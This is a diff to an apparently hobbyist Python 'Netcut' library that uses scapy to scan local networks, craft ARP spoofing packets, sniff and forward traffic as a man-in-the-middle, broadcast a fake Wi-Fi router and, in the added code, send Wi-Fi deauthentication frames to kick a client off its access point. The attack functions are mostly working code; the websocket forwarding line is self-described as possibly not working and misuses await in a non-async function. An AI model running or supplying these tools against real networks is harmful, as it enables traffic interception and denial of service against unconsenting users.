@@ -1,5 +1,10 @@
-import nmap, sys
 from scapy.all import *
+import nmap, sys
+
+"""
+Netcut library containing a few useful functions to Scan, Spoof (with ARP), and Snif a network.
+WIP: Deauth attack, fake wifi router (need Interface in monitor mode (not promiscious))
+"""
 
 # Return IP & Mac of every connected device (Root might be useful be not necessary)
 def nmap_scan(target_ip= '192.168.0.0/24'):
@@ -41,22 +46,21 @@ def arp_scan(target_ip = '192.168.0.0/24'):
 
     return clients
 
-
-def sniffing(src, dst):
+# Sniff package and display them (MITM attack)
+def sniffing(src, dst, ws):
     def editPkg(pkg):
         pkg.psrc = src
         pkg.pdst = dst
         pkg.src = getmacbyip(src)
         pkg.dst = getmacbyip(dst)
-        # print(pkg.show)
         pkg.show()
+        await ws.send(pkg.build()) #Might actually not work
         sys.stdout.flush()
         send(pkg)
     
     sniff(prn=editPkg, filter="src " + src, stop_filter = lambda x: not getattr(threading.currentThread(), "do_run", True) )
-    # sniff(prn=editPkg)
 
-
+# Craft an ARP packet design to spoof
 def craft_arp_spoof(target_ip, gateway_ip):
     return ARP(op = 2, psrc = gateway_ip, pdst = target_ip)
 
@@ -79,6 +83,21 @@ def fake_wifi_router(interface, name):
     # send the frame in layer 2 every 100 milliseconds forever
     # using the `iface` interface
     sendp(frame, inter=0.1, iface=iface, loop=1)
+
+# Deauthentificate a Wifi client from a router
+def deauth(mac_target, mac_router, network_interface):
+
+    #Dangerous option, disabled to prevent network destruction
+    if mac_target == "ff:ff:ff:ff:ff:ff": return
+    # Deauthentication Packet For Access Point
+    pkt = RadioTap()/Dot11(addr1=mac_target, addr2=mac_router, addr3=mac_router)/Dot11Deauth()
+    # Deauthentication Packet For Client
+    pkt1 = RadioTap()/Dot11(addr1=mac_router, addr2=mac_target, addr3=mac_target)/Dot11Deauth()
+
+    # send Packets To Access Point and In Arguments, iface = monitor mode enable Interface  
+    sendp(pkt, iface=network_interface)
+    sendp(pkt1, iface=network_interface)
+
 
 
 if __name__=='__main__':
